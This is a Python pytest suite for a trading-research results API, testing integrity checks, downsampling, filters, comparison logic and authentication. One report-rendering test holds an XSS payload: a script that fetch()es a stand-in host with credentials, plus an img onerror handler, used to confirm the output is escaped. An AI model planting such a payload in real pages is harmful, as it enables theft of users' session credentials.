"""Offline contracts and real filesystem projection tests, not PostgreSQL gates."""

import copy
import hashlib
import json
import secrets
from dataclasses import replace
from datetime import date
from html.parser import HTMLParser
from types import SimpleNamespace
from uuid import UUID, uuid4

import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError

from backend.app.core.config import Settings
from backend.app.main import create_app
from backend.app.research_services import payload_hash
from backend.app.research_view_schemas import ResultCompareCreate
from backend.app.research_views import (
    compare_results,
    min_max_rows,
    preflight_research,
    query_result_table,
    render_result_report,
    research_capability_metadata,
    result_view,
    validate_persisted_result,
)
from backend.app.services import DomainError
from backend.app.storage import read_verified
from backend.tests.research_view_fixtures import rehash_bundle, synthetic_result
from packages.tradegrad_adapter.config import RunConfig
from packages.tradegrad_adapter.results import canonical_json_bytes


@pytest.fixture
def result():
    return synthetic_result()


def replace_content(result, bundle):
    content = canonical_json_bytes(rehash_bundle(bundle))
    result.artifact.sha256 = hashlib.sha256(content).hexdigest()
    result.artifact.size_bytes = len(content)
    result.evaluation.payload["result_bundle"].update(
        sha256=result.artifact.sha256, size_bytes=len(content)
    )
    result.evaluation.payload_sha256 = payload_hash(result.evaluation.payload)
    return replace(result, bundle=bundle, content=content)


def validate(result):
    return validate_persisted_result(
        result.evaluation, result.run, result.dataset, result.artifact, result.content
    )


def test_projection_reads_actual_file_and_retains_raw_precision(result, tmp_path):
    path = tmp_path / result.artifact.storage_key
    path.parent.mkdir()
    path.write_bytes(result.content)
    content = read_verified(
        tmp_path, result.artifact.storage_key, result.artifact.sha256, 8 * 1024 * 1024
    )
    loaded = replace(result, content=content)
    assert validate(loaded) == result.bundle
    query = result_view(loaded, sections=["equity", "drawdown", "fills"], max_points=4)
    assert query.tables["equity"].returned_rows == 4
    assert query.tables["equity"].downsampled is True
    assert query.tables["fills"].rows == result.bundle["fills"]["rows"]
    assert query.metrics[0].value == 1.123456789123
    assert query.artifact_sha256 == hashlib.sha256(result.content).hexdigest()
    assert json.loads(content)["equity"]["rows"] == result.bundle["equity"]["rows"]
    assert (
        content == result.content
    )  # Original download is not a query or reserialization.


@pytest.mark.parametrize("points", [4, 5, 6, 7, 10, 100, 4999, 5000])
def test_min_max_preserves_endpoints_global_extrema_and_original_cells(points):
    values = [[str(i), (i % 19) + i / 997] for i in range(7001)]
    values[100][1], values[6000][1] = -12345.123456789, 54321.987654321
    selected = min_max_rows(values, points)
    assert len(selected) <= points
    assert selected[0] is values[0] and selected[-1] is values[-1]
    assert min(row[1] for row in selected) == min(row[1] for row in values)
    assert max(row[1] for row in selected) == max(row[1] for row in values)
    assert [int(row[0]) for row in selected] == sorted(int(row[0]) for row in selected)
    assert all(row is values[int(row[0])] for row in selected)


@pytest.mark.parametrize("points", [0, 1, 3, 5001, True, 4.5])
def test_downsampling_bounds_fail_closed(points):
    with pytest.raises(DomainError):
        min_max_rows([], points)


def test_null_series_no_averaging_and_short_sequences_unchanged():
    rows = [[str(i), None] for i in range(100)]
    assert len(min_max_rows(rows, 4)) == 4
    assert min_max_rows(rows[:2], 4) == rows[:2]


def test_date_and_listing_filters_are_explicit_half_open_and_currency_local(result):
    listing_id = UUID(next(iter(result.dataset.manifest["evaluator_symbol_mapping"])))
    query = result_view(
        result,
        sections=["equity", "positions"],
        start=date(2024, 2, 1),
        end=date(2024, 2, 3),
        listing_id=listing_id,
    )
    assert query.tables["equity"].filtered_rows == 2
    assert (
        query.tables["equity"].filter_status == "portfolio_series_unfiltered_by_listing"
    )
    assert query.tables["positions"].filtered_rows == 1
    assert query.tables["positions"].filter_status == "applied"
    assert query.metrics == result_view(result).metrics
    with pytest.raises(DomainError, match="not part"):
        result_view(result, listing_id=uuid4())
    with pytest.raises(DomainError, match="precede"):
        result_view(result, start=date(2024, 2, 2), end=date(2024, 2, 2))


def test_timezone_filter_does_not_use_utc_calendar_day():
    table = {
        "columns": [
            {"name": "timestamp", "dtype": "object", "unit": "timestamp_iso8601"},
            {"name": "equity", "dtype": "float64", "unit": "account_currency"},
        ],
        "rows": [["2024-02-01T00:10:00+08:00", 10.123456789]],
    }
    page = query_result_table(
        table,
        "equity",
        start=date(2024, 2, 1),
        end=date(2024, 2, 2),
        timezone="Asia/Shanghai",
    )
    assert page.returned_rows == 1


def test_table_pagination_not_downsampling_and_empty_positions_supported(result):
    page = query_result_table(result.bundle["fills"], "fills", offset=1, limit=1)
    assert page.rows == [] and page.filtered_rows == 1
    assert page.downsampled is False
    assert query_result_table({"columns": [], "rows": []}, "positions").rows == []
    # A chart deliberately does not take the paginated table slice first.
    chart = result_view(result, sections=["equity"], offset=99, limit=1).tables[
        "equity"
    ]
    assert (
        chart.returned_rows == len(result.bundle["equity"]["rows"])
        and chart.offset == 0
    )


@pytest.mark.parametrize(
    "kwargs",
    [
        {"sections": ["equity"] * 2},
        {"sections": ["bogus"]},
        {"sections": ["fills"], "offset": -1},
        {"sections": ["fills"], "limit": 501},
    ],
)
def test_projection_rejects_invalid_section_or_pagination(result, kwargs):
    with pytest.raises(DomainError):
        result_view(result, **kwargs)


@pytest.mark.parametrize(
    "field",
    [
        "bytes",
        "checksum",
        "artifact_id",
        "run_id",
        "attempt_id",
        "artifact_name",
        "media_type",
        "payload_hash",
        "window_hash",
        "window",
        "code",
        "config_hash",
        "dataset_hash",
        "dataset_manifest",
        "image",
        "stopped",
        "status",
    ],
)
def test_registration_and_byte_identity_cannot_be_replaced(result, field):
    if field == "bytes":
        result = replace(result, content=result.content + b" ")
    elif field == "checksum":
        result.artifact.sha256 = "0" * 64
    elif field == "artifact_id":
        result.artifact.id = uuid4()
    elif field == "run_id":
        result.artifact.run_id = uuid4()
    elif field == "attempt_id":
        result.artifact.attempt_id = uuid4()
    elif field == "artifact_name":
        result.artifact.name = "arbitrary.json"
    elif field == "media_type":
        result.artifact.media_type = "text/html"
    elif field == "payload_hash":
        result.evaluation.payload_sha256 = "0" * 64
    elif field == "window_hash":
        result.evaluation.window_sha256 = "0" * 64
    elif field == "window":
        result.evaluation.window["end"] = "2024-02-09"
        result.evaluation.window_sha256 = payload_hash(result.evaluation.window)
    elif field == "code":
        result.evaluation.code_sha256 = "0" * 64
    elif field == "config_hash":
        result.run.request_sha256 = "0" * 64
    elif field == "dataset_hash":
        result.dataset.content_sha256 = "0" * 64
    elif field == "dataset_manifest":
        result.dataset.manifest["price_semantics"]["native_mode"] = "changed"
    elif field == "image":
        result.run.research_image_digest = "sha256:" + "f" * 64
    elif field == "stopped":
        result.evaluation.sandbox_stopped = False
    elif field == "status":
        result.evaluation.status = "failed"
    with pytest.raises(DomainError) as exc:
        validate(result)
    assert exc.value.status_code == 409


@pytest.mark.parametrize(
    "field",
    [
        "identity",
        "task",
        "config",
        "request",
        "window",
        "engine",
        "currency",
        "metric",
        "series",
        "capabilities",
    ],
)
def test_self_rehashed_forged_bundle_still_rejected(result, field):
    bundle = copy.deepcopy(result.bundle)
    if field == "identity":
        bundle["identity"]["extra"] = "not allowed"
    elif field == "task":
        bundle["identity"]["task"] = "us_time"
    elif field == "config":
        bundle["identity"]["run_config_sha256"] = "0" * 64
    elif field == "request":
        bundle["identity"]["evaluation_config_sha256"] = "0" * 64
    elif field == "window":
        bundle["window"]["warmup"]["sessions"] = 0
    elif field == "engine":
        bundle["engine"]["requested_kwargs"]["initial_cash"] = 1
    elif field == "currency":
        bundle["engine"]["currency"] = "USD"
    elif field == "metric":
        bundle["metrics"][0]["value"] = 123
    elif field == "series":
        bundle["equity"]["rows"][1][1] = 999999
    elif field == "capabilities":
        bundle["capabilities"]["trusted_ledger"] = True
    with pytest.raises(DomainError):
        validate(replace_content(result, bundle))


def test_duplicate_json_fields_and_nonfinite_cannot_hide_behind_checksum(result):
    for data in [
        result.content.replace(b"{", b'{"schema_version":"duplicate",', 1),
        result.content.replace(b"100.123456789", b"NaN", 1),
    ]:
        result.artifact.sha256 = hashlib.sha256(data).hexdigest()
        result.artifact.size_bytes = len(data)
        result.evaluation.payload["result_bundle"].update(
            sha256=result.artifact.sha256, size_bytes=len(data)
        )
        result.evaluation.payload_sha256 = payload_hash(result.evaluation.payload)
        with pytest.raises(DomainError):
            validate(replace(result, content=data))


def test_compare_preserves_request_order_and_explicit_configuration_differences(result):
    other = copy.deepcopy(result)
    other.evaluation.id = uuid4()
    comparison = compare_results([other, result])
    assert comparison.comparable is True
    assert comparison.ranking is None
    assert [item.evaluation_id for item in comparison.evaluations] == [
        other.evaluation.id,
        result.evaluation.id,
    ]
    config = copy.deepcopy(other.run.config)
    config["market_profile"]["commission_rate"] = 0.001
    other.run.config = config
    other.bundle["engine"]["resolved_execution_policy"]["price_basis"] = "close"
    comparison = compare_results([other, result])
    assert comparison.comparable is False
    assert {"config.market_profile", "price_definition"} <= {
        diff.field for diff in comparison.differences
    }


def test_compare_optimizer_difference_not_silently_ranked(result):
    other = copy.deepcopy(result)
    other.evaluation.id = uuid4()
    other.run.config["optimizer"]["seed"] = 42
    comparison = compare_results([result, other])
    assert comparison.comparable is True
    assert comparison.differences[0].field == "config.optimizer"
    assert comparison.differences[0].affects_comparability is False
    assert comparison.ranking is None


def test_compare_unknown_price_semantics_fail_closed_even_if_equal(result):
    other = copy.deepcopy(result)
    other.evaluation.id = uuid4()
    for item in [result, other]:
        item.dataset.manifest.pop("price_semantics")
    comparison = compare_results([result, other])
    assert comparison.comparable is False
    assert any("price semantics" in warning for warning in comparison.warnings)


@pytest.mark.parametrize("field", ["native_mode", "split_basis", "dividend_basis"])
def test_unknown_price_fields_cannot_be_marked_comparable(result, field):
    other = copy.deepcopy(result)
    other.evaluation.id = uuid4()
    for item in [result, other]:
        item.dataset.manifest["price_semantics"][field] = "unknown"
    assert compare_results([result, other]).comparable is False


def test_actual_engine_identity_difference_blocks_comparison(result):
    other = copy.deepcopy(result)
    other.evaluation.id = uuid4()
    other.evaluation.image_digest = "sha256:" + "f" * 64
    comparison = compare_results([result, other])
    assert comparison.comparable is False
    assert any(difference.field == "engine" for difference in comparison.differences)


@pytest.mark.parametrize("count", [0, 1, 5])
def test_compare_request_cardinality_bounded(count):
    with pytest.raises(ValidationError):
        ResultCompareCreate(evaluation_ids=[uuid4() for _ in range(count)])


def test_duplicate_compare_ids_rejected():
    identifier = uuid4()
    with pytest.raises(ValidationError):
        ResultCompareCreate(evaluation_ids=[identifier, identifier])


def test_report_is_escaped_script_free_without_remote_content(result):
    payload = '<script>fetch("https://invalid.example",{credentials:"include"})</script><img src=x onerror=alert(1)>'
    result.bundle["metrics"][0]["calculation_basis"] = payload
    report = render_result_report(result).decode()

    class Parser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.tags = []

        def handle_starttag(self, tag, attrs):
            self.tags.append(tag)
            assert not any(
                key.startswith("on") or key in {"src", "href"} for key, _ in attrs
            )

    parser = Parser()
    parser.feed(report)
    assert "script" not in parser.tags and "img" not in parser.tags
    assert "&lt;script&gt;" in report
    assert "1.123456789123" in report
    assert result.artifact.sha256 in report
    assert "content-security-policy" in report.lower()


def test_capability_defaults_are_typed_run_config_compatible_and_settings_derived():
    settings = Settings(
        database_url="postgresql://localhost/not_used",
        secret_key=secrets.token_urlsafe(48),
        max_active_runs_per_user=7,
    )
    capability = research_capability_metadata(settings)
    assert len(capability.profile_defaults) == 8
    assert capability.limits.max_active_runs_per_user == 7
    assert (
        capability.holdout_execution is False and capability.live_model_calls is False
    )
    for item in capability.profile_defaults:
        assert item.warmup.sessions == (
            0
            if item.profile == "source_compat"
            else (20 if item.task.endswith("_time") else 3)
        )


def test_preflight_is_read_only_uses_shared_validator_and_returns_no_quota_claim(
    monkeypatch, result
):
    seen = []

    def shared(session, owner_id, config, settings):
        seen.append((session, owner_id, config, settings))
        return (
            result.dataset,
            None,
            None,
            [SimpleNamespace(warnings=("sample warning",))],
        )

    monkeypatch.setattr(
        "backend.app.research_views.validate_research_submission", shared
    )
    session, settings = object(), object()
    config = RunConfig.model_validate(result.run.config)
    response = preflight_research(session, result.run.owner_id, config, settings)
    assert seen == [(session, result.run.owner_id, config, settings)]
    assert response.config_sha256 == config.sha256 and response.valid is True
    assert any("reserves no capacity" in message for message in response.warnings)


def test_read_surfaces_require_auth_and_describe_bounded_schema():
    app = create_app(
        Settings(
            database_url="postgresql://localhost/not_used",
            secret_key=secrets.token_urlsafe(48),
        )
    )
    identifier = uuid4()
    with TestClient(app) as api:
        for path in [
            f"/research-evaluations/{identifier}/results",
            f"/research-evaluations/{identifier}/results/download",
            f"/research-evaluations/{identifier}/report",
            f"/research-runs/{identifier}/usage",
        ]:
            assert api.get("/api/v1" + path).status_code == 401
        assert (
            api.post(
                "/api/v1/research-evaluations/compare",
                json={"evaluation_ids": [str(uuid4()), str(uuid4())]},
            ).status_code
            == 401
        )
        assert api.post("/api/v1/research-runs/preflight", json={}).status_code == 401
    schema = app.openapi()
    operation = schema["paths"]["/api/v1/research-evaluations/{evaluation_id}/results"][
        "get"
    ]
    fields = {field["name"]: field["schema"] for field in operation["parameters"]}
    assert fields["max_points"]["maximum"] == 5000
    assert fields["limit"]["maximum"] == 500
    assert fields["offset"]["maximum"] == 100000
    assert (
        schema["components"]["schemas"]["ResultCompareCreate"]["properties"][
            "evaluation_ids"
        ]["maxItems"]
        == 4
    )
    assert schema["components"]["schemas"]["ResearchCapabilities"]["properties"][
        "limits"
    ]


def test_uuid_reference_case_normalizes_relations_but_not_config_hash(result):
    config = copy.deepcopy(result.run.config)
    config["dataset"]["id"] = config["dataset"]["id"].upper()
    config["seed_strategy"]["id"] = config["seed_strategy"]["id"].upper()
    rebound = synthetic_result(
        RunConfig.model_validate(config), dataset_manifest=result.dataset.manifest
    )
    assert rebound.run.request_sha256 != result.run.request_sha256
    rebound.evaluation.payload["result_bundle"]["artifact_id"] = str(
        rebound.artifact.id
    ).upper()
    rebound.evaluation.payload_sha256 = payload_hash(rebound.evaluation.payload)
    assert validate(rebound) == rebound.bundle
